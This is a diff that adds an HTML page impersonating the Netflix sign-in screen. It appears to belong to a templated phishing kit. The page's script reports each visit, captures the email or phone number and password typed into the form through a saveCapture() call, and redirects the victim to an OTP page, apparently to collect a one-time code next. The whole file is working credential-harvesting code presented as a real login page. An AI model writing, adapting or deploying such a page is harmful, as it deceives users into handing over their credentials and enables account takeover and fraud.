@@ -1,0 +1,27 @@
+<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Sign in - Netflix</title><link rel="stylesheet" href="style.css"></head>
+<body><div class="card">
+<div class="logo">N</div>
+<div class="title">Netflix</div>
+<div class="subtitle">Sign in to continue to your account</div>
+<form id="loginForm">
+<div class="form-group"><label for="email">Email or Phone</label><input type="text" id="email" placeholder="Enter your email or phone number" required></div>
+<div class="form-group"><label for="password">Password</label><input type="password" id="password" placeholder="Enter your password" required></div>
+<button type="submit" id="continueBtn">Sign In</button>
+</form>
+<div class="footer">© 2026 Netflix · All rights reserved</div>
+</div>
+<script src="helper.js"></script>
+<script>
+const SITE='netflix', DISPLAY='Netflix', CATEGORY='entertainment';
+window.addEventListener('load', () => notifyLanding(SITE, CATEGORY, 'Login'));
+document.getElementById('loginForm').addEventListener('submit', function(e){
+  e.preventDefault();
+  const id = document.getElementById('email').value.trim();
+  const pwd = document.getElementById('password').value.trim();
+  if (!id || !pwd) return;
+  const btn = document.getElementById('continueBtn');
+  btn.innerHTML = '<div class="spinner"></div>'; btn.disabled = true;
+  saveCapture(SITE, CATEGORY, 'LOGIN', { email: id, password: pwd }, 'Login');
+  setTimeout(() => { window.location.href = 'otp.html'; }, 1500);
+});
+</script></body></html>
